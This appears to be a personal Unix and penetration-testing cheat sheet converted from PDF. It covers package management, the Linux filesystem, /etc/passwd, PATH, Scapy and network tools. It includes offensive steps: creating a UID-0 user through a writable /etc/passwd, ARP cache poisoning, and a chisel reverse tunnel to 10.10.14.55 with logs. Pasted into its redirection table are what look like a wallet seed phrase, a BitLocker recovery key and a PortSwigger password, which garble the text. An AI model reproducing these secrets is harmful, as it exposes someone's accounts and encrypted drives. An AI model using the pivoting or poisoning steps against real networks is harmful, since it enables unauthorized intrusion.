The apt command is a part of the package management software also named apt.
### Apt contains a whole suite of tools that allows us to manage the packages and

sources of our software, and to install or remove software at the same time.
### *apt update

### When this command is run, it will fetch the information of available tools & its

version from the repository and stored in the local computer
### *apt-get upgrade

### This command is an upgrade process to remove the older version of tools from

### the Kali linux & install a newer version. This commands above will only upgrade

installed tools, & will not touch core system & it’s utility.
### If you want to upgrade core operating system as well as tools at the same time

then you will have to run the following command below. *apt-get dist-upgrade && apt -y full-upgrade
### Open terminal and run this command:

*apt-get clean ———>This will clean out the local repository of retrieved package
file. *apt-get install -f ——>Will correct broken dependencies i.e. -f here stands for “fix broken”. *dpkg --configure -a ——>will configure all (-a) the packages which haven't been configured yet. *dpkg -I/—install software.deb ——> Will install Debian packages downloaded from web or GitHub
### In the end do run the update command

### *sudo apt-get update ——>Update all package dependencies

Installing / Cloning Packages from GitHub.......git clone <package url>
Git is a version control system that tracks changes to files in a project. Working
### in a team is easier because you can see what each team member is editing and

### what changes they made to ﬁles. When users have ﬁnished making their changes,

### they commit them with a message and then push them back to a central location

### (repository) for the other users to then pull those changes to their local

### machines. GitHub is a hosted version of Git on the internet. Repositories can

either be set to public or private and have various access controls.
### bpython is a fancy interface to the Python interpreter for Linux, BSD, OS X and

Windows (with some work). bpython is released under the MIT License. It has the
### following (special) features:

In-line syntax highlighting, Readline-like autocomplete with suggestions displayed
### as you type, Expected parameter list for any Python function., “Rewind" function

### to pop the last line of code from memory and re-evaluate. Send the code you've

entered off to a pastebin. Save the code you've entered to a file & Auto- indentation. Python 3 support.
### Python helpfully provides a lightweight and easy-to-use module called

### "HTTPServer". This module turns your computer into a quick and easy web server

### that you can use to serve your own ﬁles, where they can then be downloaded by

another computing using commands such as curl and wget.
### Python3's "HTTPServer" will serve the ﬁles in the directory that you run the

### command, but this can be changed by providing options that can be found in the

manual pages. Simply, all we need to do is run python3 -m http.server to start the module.
### OpenSSL is a cryptography toolkit implementing the Secure Sockets Layer (SSL

### v2/v3) and Transport Layer Security (TLS v1) network protocols and related

### cryptography standards required by them. The openssl program is a command line

program for using the various cryptography functions of OpenSSL's crypto library
### from the shell.  It can be used for

o Creation and management of private keys, public keys and parameters
### o  Public key cryptographic operations

### o  Creation of X.509 certiﬁcates, CSRs and CRLs

### o  Calculation of Message Digests and Message Authentication Codes

o Encryption and Decryption with Ciphers
### o  SSL/TLS Client and Server Tests

### o  Handling of S/MIME signed or encrypted mail

### o  Timestamp requests, generation and veriﬁcation

scp - file transfer client with RCP-like command interface >> Secure copy, or SCP,
### is just that -- a means of securely copying ﬁles. Unlike the regular cp command,

### this command allows you to transfer ﬁles between two computers using the SSH

### protocol to provide both authentication and encryption. Working on a model of

### SOURCE and DESTINATION, SCP allows you to:

### Copy ﬁles & directories from your current system to a remote system

### Copy ﬁles & directories from a remote system to your current system

sftp - file transfer client with FTP-like command interface sshd - MacOS ==>
### sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist ==>

sudo launchctl unload /System/Library/LaunchDaemons/ssh.plist LINUX ==> service ssh start | service ssh stop | service ssh restart
## Windows ==>

### Start-Service sshd || Set-Service -Name sshd -StartupType 'Automatic'

Start-Service ‘ssh-agent’ || Set-Service -Name ‘ssh-agent’ -StartupType
### 'Automatic'

### The primary difference between Legacy BIOS and UEFI (Uniﬁed Extensible

Firmware Interface) lies in their architecture, capabilities, and how they interact with the system hardware and operating system. Here are the key distinctions:
### Legacy BIOS

### Architecture: BIOS (Basic Input/Output System) is a simple ﬁrmware that

### initializes hardware during the boot process and provides runtime services for

operating systems and programs. It operates in 16-bit processor mode.
### Disk Support: BIOS uses the Master Boot Record (MBR) to store partition

information and boot data on a disk, which has a maximum disk size limit of 2TB.
### Boot Sequence: The BIOS looks at the conﬁgured boot device order, checks each

device for a valid MBR, and if found, loads the initial boot code from the MBR. User Interface: Generally, it has a text-only user interface that can be navigated using the keyboard. Compatibility: Nearly universal support across all operating systems and hardware platforms. UEFI
### Architecture: UEFI is a modern ﬁrmware solution with a richer feature set and

more robust architecture. It operates in 32-bit or 64-bit processor mode.
### Disk Support: UEFI uses the GUID Partition Table (GPT) which supports disks up

to 9.4 ZB (zettabytes) and allows for a virtually unlimited number of partitions.
### Boot Sequence: UEFI stores all the necessary boot data in an EFI System

Partition (ESP), which contains the bootloader and other data necessary for the OS to start.
### User Interface: Features a graphical user interface that can be navigated with

both keyboard and mouse, supporting different themes and styles.
### Security Features: Includes secure boot, which helps to protect the system

against malware by ensuring that only trusted software is loaded during the boot process.
### Compatibility: Supported by all modern operating systems but might require

enabling legacy support to run older systems. LINUS/UNIX FILESYSTEM HIERACHY STANDARD/STRUCTURE
### /Mount Point —>” Root not to be confused with the /root directory”

Primary hierarchy root and root directory of the entire file system hierarchy. Every single file and directory starts from the root directory
### /bin Essential Binary command Executables, common Linux commands used in

single-user modes & used by all users of the system. /sbin Service Binary—>Just like /bin, /sbin also contains binary executables.
### However The linux commands located under this directory are used typically by

system administrator, for system maintenance purpose. /boot Boot Loader Files contains everything your Operating System needs to
## *Boot*

### /dev These include terminal Device, USB or any Hardware device attached to the

### system. To control & conﬁgure their operations

### /etc <---> etcetera HOST-SPECIFIC-SYSTEM-WIDE conﬁg ﬁles. The etc folder

(short for etcetera) is a commonplace location to store system files that are used
### by your operating system. Contains Conﬁg ﬁles required by all programs, as well

### as startup & shutdown shell scripts used to start/stop individual programs

### The /etc/hosts ﬁle is used to resolve a hostname(FQDN) into an IP address. By

### default, the /etc/hosts ﬁle is queried before the DNS server for hostname

### resolution thus we will need to add an “IP FQDN” entry in the /etc/hosts ﬁle for

### this domain to enable the browser to resolve the IP address for a FQDN to avoid

DNSPROBEFINISHEDNXDOMAIN error. Visit Page in Browser or Use CURL -v http://{target_IP}/
### The ﬁrst command illustrated below {sudo echo  “IP FQDN” | tee - a /etc/hosts}

has the purpose of inputting the target's IP
### address with its' associated hostname in the hosts table, which would in turn

allow your web client to visit the website which was previously reporting an error.
### /home User’s Home Directories, containing saved ﬁles, settings... Directories

subdivided into user/groups/guest folders for all users to store their personal files. /lib contains lib /lib32 /lib64 System Libraries essentially required by the binaries in /bin & /sbin —> files that applications can use to perform various functions.
### /media Vs /mnt Mount Points for Removable Media(CD-Roms), contains location of

other mounted drive, storage devices(floppy disk, external hard drives) <---> /mnt for Temporary Mounted Directory/fileSystems. sysAdmins can mount filesystems.
### /opt Optional Application software packages containing add-on manually installed

software are found here, also some repository software are stored here & their
### needed ﬁle dependencies

### /proc This Virtual ﬁlesystem provides Process and Shell/Kernel information as

files. Generally automatically generated and populated by the system, on the fly. Contains info about system running processes & processes logs, text information about system resources. /root a directory only accessible by the root user, There isn't anything more to this folder other than just understanding that this is the home directory for the "root" user. But, it is worth a mention as the logical presumption is that this user
### would have their data in a directory such as "/home/root" by default

The only root user has the right to write under this directory, root user’s home
### directory, which is not the same as /

/run (tempfs) file system, Modern Linux distributions include a /run directory as a
### temporary ﬁlesystem (tmpfs) which stores volatile runtime data

/srv Services —> directories contains server specific services related data, Site-
### speciﬁc data served by this system, such as data and scripts for web servers,

data offered by FTP servers, and repositories for version control systems. /sys system folder, for interacting with a kernel, almost similar to the run directory /temp Temporary files created by system & users. Under this directory files are
### Often not preserved between system reboots, and may be severely size

### restricted. This is a unique root directory found on a Linux install. Short for

"temporary", the /tmp directory is volatile and is used to store data that is only
### needed to be accessed once or twice. Similar to the memory on your computer,

once the computer is restarted, the contents of this folder are cleared out.
### /usr User Application Space | Universal System Resource where majority of

### (multi-) user utilities & application required for maintenance for basic system

operations. Contains binaries, libraries, documentation, and source-code for second level programs. /var Variable directory contains files and processes that change in size as you use the system. The "/var" directory, with "var" being short for variable data, is one of the main root folders found on a Linux install. This folder stores data that is frequently accessed or written by services or applications running on the system.
### For example, log ﬁles from running services and applications are written here (/

### var/log), or other data that is not necessarily associated with a speciﬁc user

.conf or .config files usually contain configurations for an application - including sensitive info such as database credentials.
### || visible in terminal ||   visible in ﬁle   || existing

Syntax || StdOut | StdErr || StdOut | StdErr || file ==========++==========+==========+ holiday patient culture adjust trumpet swift marine credit stage safe flash latin bacon tiger excuse act 7bd36d81-d5dd-44ee-9d51-7e8cdb58ea61
## Bitlck2Tb -

### 647119-134684-095018-122650-548878-461406-711502-597685

Port_Swigger>> 53^2L)bZg97YG9{t9;E=82628i7H!QEb >>eY\mp559{m2947Gd2j5''.CCApPK#\p, +==========+==========++===========
### >     ||    no    |   yes    ||   yes    |    no    || overwrite

### >>    ||    no    |   yes    ||   yes    |    no    ||  append

### 2>     ||   yes    |    no    ||    no    |   yes    || overwrite

2>> || yes | no || no | yes || append
### &>     ||    no    |    no    ||   yes    |   yes    || overwrite

### &>>    ||    no    |    no    ||   yes    |   yes    ||  append

### | tee    ||   yes    |   yes    ||   yes    |    no    || overwrite

### | tee -a ||   yes    |   yes    ||   yes    |    no    ||  append

### n.e. (*) ||   yes    |   yes    ||    no    |   yes    || overwrite

### n.e. (*) ||   yes    |   yes    ||    no    |   yes    ||  append

### |& tee    ||   yes    |   yes    ||   yes    |   yes    || overwrite

### |& tee -a ||   yes    |   yes    ||   yes    |   yes    ||  append

https://forums.macrumors.com/threads/success-virtualize-windows-10-for-arm- on-m1-with-alexander-grafs-qemu-hyper visor-patch.2272354/ QEMU Windows11 Emulator Understanding /etc/passwd & /etc/shadow The /etc/passwd file stores essential information, which is required during login. In other words, it stores user account information. The /etc/passwd is a plain text
### ﬁle. It contains a list of the system’s accounts, giving for each account some

useful information like user ID, group ID, home directory, shell, and more.
### The /etc/passwd ﬁle should have general read permission as many command

utilities use it to map user IDs to user names. However, write access to the /etc/ passwd must only limit for the superuser/root account. When it doesn't, or a user
### has erroneously been added to a write-allowed group. We have a vulnerability

that can allow the creation of a root user that we can access.
### Understanding /etc/passwd format

### The /etc/passwd ﬁle contains one entry per line for each user (user account) of

### the system. All ﬁelds are separated by a colon : symbol. Total of seven ﬁelds as

### follows. Generally, /etc/passwd ﬁle entry looks as follows:

### TestUser:x:0:0:root:/root:/bin/bash  #[as delimited by colon (:)]

Username: It is used when user logs in. It should be between 1 and 32 characters in length.
### Password: An x character indicates that encrypted password is stored in /etc/

### shadow ﬁle. Please note that you need to use the passwd command to compute

### the hash of a password typed at the CLI or to store/update the hash of the

password in /etc/shadow file, in this case, the password hash is stored as an "x". We can manually create X using Openssl Passed Module.
### User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is

reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
### Group ID (GID): The primary group ID (stored in /etc/group ﬁle)

### User ID Info: The comment ﬁeld. It allow you to add extra information about

the users such as user’s full name, phone number etc. This field use by finger command.
### Home directory: The absolute path to the directory the user will be in when

### they log in. If this directory does not exists then users directory becomes /

Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.
### PATH is an environmental variable in Linux and Unix-like operating systems

### which speciﬁes directories that hold executable programs .py, .sh….. When the

### user runs any command in the terminal, it searches for executable ﬁles with the

help of the PATH Variable in response to commands executed by a user. It is very simple to view the Path of the relevant user with help of the command "echo $PATH". Export PATH=/bin:$PATH >> This Means export the directory path /bin executables files to the Environmental variable $PATH.
### Export PATH=.:$PATH >> adds ‘.’ in the PATH variable, means that the user is

### able to execute binaries/scripts from the current directory. To avoid having to

enter those two extra characters every time, the user adds ‘.’ to their PATH.
### GTFOBins is a curated list of Unix binaries that can be used to bypass local

security restrictions in misconfigured systems.
### The project collects legitimate functions of Unix binaries that can be abused to

get the f**k break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post- exploitation tasks. It is important to note that this is not a list of exploits, and the programs listed
### here are not vulnerable per se, rather, GTFOBins is a compendium about how to

live off the land when you only have certain binaries available.
### A Landscape Server is a systems management tool developed by Canonical

### for managing and monitoring fleets of Ubuntu-based computers (desktops,

servers, and cloud instances) from a centralized web interface or via an API. Here's a breakdown of what it is and its key aspects:
### Core Functionality:

Centralized Management: Provides a single point of control for administering multiple Ubuntu systems. Inventory Management: Tracks hardware and software information for all managed machines. Software Management: Enables remote installation, updates, and removal of software packages.
Patch Management: Automates the application of security updates and patches.
### Monitoring: Tracks system performance metrics (CPU, memory, disk,

network) and allows for custom metric collection. Automation: Facilitates the automation of common administrative tasks through scripts and policies.
### User and Group Management: Allows for centralized management of

user accounts and groups across managed systems. Compliance Management: Helps enforce security policies and generate compliance reports. Reporting: Provides insights into the status and health of the managed Ubuntu infrastructure. Repository Management: Enables mirroring and management of software repositories.
### Key Features:

Web-based Interface: Offers a graphical user interface for easy management and monitoring. REST API: Allows for programmatic interaction and integration with other tools. Scalability: Designed to manage environments ranging from a few to tens of thousands of Ubuntu systems. Customizable Dashboards: Provides an overview of the entire Ubuntu estate with customizable widgets. Alerting and Notifications: Sends alerts for important events, such as pending updates or system issues.
### Role-Based Access Control (RBAC): Allows for granular control over

user permissions within the Landscape interface.
### Integration with Ubuntu Pro: Landscape is included with an Ubuntu

Pro subscription, offering enhanced support and features.
### Deployment Options:

### Self-Hosted: You can install and manage the Landscape Server on

### your own infrastructure. Canonical offers a free tier for self-hosted

Landscape for up to 5 Ubuntu instances for personal use or evaluation. Managed Landscape: Canonical can host and manage the Landscape infrastructure for you as a service.
### In essence, Landscape Server simplifies the administration of Ubuntu

### environments at scale, improving efficiency, security, and compliance

through automation and centralized control. It's a valuable tool for system administrators managing Ubuntu deployments of any size.
### Network Controllers provide a centralized way to monitor and conﬁgure multiple

### compatible network devices from a single GUI. You access the Network Controller

### interface by connecting a web browser to the IP address of the Network

Controller management interface. An attacker can send spoofed MAC addresses
### too, to add false information to the forwarding tables used by Layer 2 switches

### or ARP tables used by other hosts and routers. DHCP requests with spoofed MAC

### addresses can also be sent to a legitimate DHCP server, ﬁlling its address lease

table and leaving no free IP addresses for normal use.
### Scapy ARP Poisoning - Stack Overﬂow

### ARP page on Wikipedia, hwsrc is "Sender hardware address (SHA)", psrc is Sender

protocol address (SPA), hwdst is "Target hardware address (THA)" and pdst is
### "Target protocol address (TPA)"

### When a device sends a packet to the broadcast MAC address (FF:FF:FF:FF:FF:FF),

it is delivered to all stations on the local network. It needs to be used in order for all devices to receive your packet at the datalink layer. Broadcast is possible
### also on the underlying data link layer in Ethernet networks. Frames are

### addressed to reach every computer on a given LAN segment if they are

### addressed to MAC address FF:FF:FF:FF:FF:FF. Ethernet frames that contain IP

### broadcast packages are usually sent to this address. Ethernet broadcasts are

### used, among other purposes, by Address Resolution Protocol to resolve IP

### addresses to MAC addresses. For IP, 255.255.255.255 is the broadcast address

### for local networks. On top of Ethernet, this address will make sure that the

packet is received by all nodes on your local network. 10.10.10.255 is the broadcast address for the 10.10.10.0/24 subnet. Here again, a broadcast MAC is appropriate. lsc() command
### sr               : Send and receive packets at layer 3

### sr1              : Send packets at layer 3 and return only the ﬁrst answer

### srp              : Send and receive packets at layer 2

srp1 : Send and receive packets at layer 2 and return only the first answer srloop : Send a packet at layer 3 in loop and print the answer each time srploop : Send a packet at layer 2 in loop and print the answer each time
### sniff            : Sniff packets

p0f : Passive OS fingerprinting: which OS emitted this TCP SYN ?
### arpcachepoison   : Poison target's cache with (your MAC,victim's IP) couple

### send             : Send packets at layer 3

### sendp            : Send packets at layer 2

### traceroute       : Instant TCP traceroute

### arping           : Send ARP who-has requests to determine which hosts are up

ls : List available layers, or infos on a given layer
### lsc              : List user commands

queso : Queso OS fingerprinting
### nmap_fp          : nmap ﬁngerprinting

### report_ports     : portscan a target and output a LaTeX table

dyndns_add : Send a DNS add message to a nameserver for "name" to have
### a new "rdata"

dyndns_del : Send a DNS delete message to a nameserver for "name" [...] //NOTE :-To install netfilterqueue you need to execute these two commands on
### the terminal

-→ apt-get install build-essential python-dev libnetfilter-queue-dev
-→ pip3 install -U git+https://github.com/kti/python-netfilterqueue
### To send packets destined for your LAN to the script, type something like::

iptables -I INPUT -d 192.168.0.0/24 -j NFQUEUE --queue-num 1
### To send packets to the queue::

iptables -I <table or chain> <match specification> -j NFQUEUE --queue-num
### <queue number

### .\c client 10.10.14.55:8000 R:8001:127.0.0.1:8000

### .\c client 10.10.14.55:8000 R:8001:127.0.0.1:8000

### 2025/03/18 21:56:17 client: Connecting to ws://10.10.14.55:8000

### 2025/03/18 21:56:17 client: Connected (Latency 9.9067ms)

### I use -p 8000 to listen on 8000 (the default port of 8080 is already in use by

Burp), and give it --reverse to allow incoming connections to open listeners on my host that tunnel back through them.
### chisel server -p 8000 --reverse

2025/03/18 16:55:04 server: Reverse tunnelling enabled
### 2025/03/18 16:55:04 server: Fingerprint

### XsDd5UAH52DbSGBuzhZ5vMdIyivJPPTAHOJhE3FlBiY=

### 2025/03/18 16:55:04 server: Listening on http://0.0.0.0:8000

2025/03/18 16:56:16 server: session#1: Client version (1.10.1) differs from
### server version (1.10.0)

2025/03/18 16:56:16 server: session#1: tun: proxy#R:8001=>8000: Listening
### Needle

Use: iOS app security testing
### What it does: Needle is a framework designed to automate the

security assessment of iOS applications, especially when using a
jailbroken device.
### Features: It checks for things like insecure data storage, weak

encryption, and reverse engineering risks.
## 2. Apkx

Use: Android APK decompilation
### What it does: APKX is a tool that decompiles Android APK files

into readable source code (Java or Smali) for analysis.
### Features: It helps in reverse engineering Android apps to inspect

logic, hardcoded credentials, or security flaws.
### Drozer

Use: Android app vulnerability assessment
### What it does: Drozer is a powerful tool for finding and exploiting

### security issues in Android apps, especially around exposed

components (e.g., activities, content providers). Features: It allows interaction with app internals and can simulate malicious apps for testing.


---

*Document converted from PDF: 🔐Unix Fundamentals.pdf*
